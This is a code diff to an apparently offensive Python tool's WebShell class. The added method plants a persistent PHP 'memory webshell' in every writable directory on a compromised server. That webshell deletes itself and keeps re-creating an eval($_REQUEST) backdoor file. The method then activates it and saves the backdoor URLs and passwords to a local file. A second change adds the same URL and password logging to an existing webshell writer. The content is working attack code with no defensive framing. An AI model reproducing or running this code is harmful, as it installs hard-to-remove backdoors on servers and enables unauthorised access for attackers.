@@ -96,6 +96,42 @@ class WebShell():
             Log.error("Error occured! %s" % output[1])
             return []
 
+    def auto_inject_memery_webshell(self, filename, password):
+        print "[+] Auto inject memery webshell..."
+        webshell_content = "<?php set_time_limit(0); ignore_user_abort(true); $filename = '%s'; $password = '%s'; $content = '<?php eval($_REQUEST['.$password.']);?>'; unlink(__FILE__); while(true){ if (!file_exists($filename)){ file_put_contents($filename, $content); } usleep(0x10); } ?>" % (filename, password)
+        base64_encoded_webshell = webshell_content.encode("base64").replace("\n", "")
+        writable_dirs = self.get_writable_directory()
+        for writable_dir in writable_dirs:
+            Log.info("-" * 32)
+            memery_webshell_filename = ".index.php"
+            base_url = "%s%s/" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
+            url = base_url + memery_webshell_filename
+            path = "%s/%s" % (writable_dir, memery_webshell_filename)
+            code = "if(file_put_contents('%s', base64_decode('%s'))){echo 'Success!';}else{echo 'Failed!';}" % (path, base64_encoded_webshell)
+            code_exec_result = self.php_code_exec_token(code)[1]
+            if ("Success!" in code_exec_result):
+                Log.success("Injection finished!")
+                Log.info("Trying to visit : [%s] to active the webshell..." % (url))
+                Log.info("Setting timeout to 1 second ...")
+                try:
+                    response = requests.get(url, timeout=1)
+                    Log.error("Error! Maybe the directory cannnot execute php script!")
+                    Log.error("\n%s\n" % (response.content))
+                except Exception as e:
+                    error_content = str(e)
+                    print e
+                    if "" in error_content:
+                        Log.success("Webshell actived! (%s)" % (error_content))
+                        webshell_url = "%s%s" % (base_url, filename)
+                        Log.info("Url : %s" % (webshell_url))
+                        Log.info("Password : %s" % (password))
+                        with open("Webshell.txt", "a+") as f:
+                            log_content = "%s => %s\n" % (webshell_url, password)
+                            f.write(log_content)
+                    else:
+                        Log.error("Error! Maybe the directory cannnot execute php script!")
+            else:
+                Log.error("Error! Maybe the directory is not writable!")
 
     def get_suid_binaries(self):
         paths = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin', '/usr/games', '/usr/local/games', '/snap/bin']
@@ -507,12 +543,16 @@ class WebShell():
         webshell_content = "<?php eval($_REQUEST[%s]);?>" % (password)
         Log.info("Code : [%s]" % (webshell_content))
         Log.info("Getting writable dirs...")
-        writale_dirs = self.get_writable_directory()
-        if len(writale_dirs) == 0:
+        writable_dirs = self.get_writable_directory()
+        if len(writable_dirs) == 0:
             Log.error("No writable dirs...")
         else:
-            for writable_dir in writale_dirs:
+            for writable_dir in writable_dirs:
                 Log.info("Writing [%s] into : [%s]" % (webshell_content, writable_dir))
                 php_code = "file_put_contents('%s',base64_decode('%s'));" % ("%s/%s" % (writable_dir, filename), webshell_content.encode("base64").replace("\n",""))
                 self.php_code_exec(php_code)
-
+                base_url = "%s%s" % ("".join(["%s/" % (i) for i in self.url.split("/")[0:3]]), writable_dir.replace("%s/" % (self.webroot), ""))
+                webshell_url = "%s/%s" % (base_url, filename)
+                with open("Webshell.txt", "a+") as f:
+                    log_content = "%s => %s\n" % (webshell_url, password)
+                    f.write(log_content)
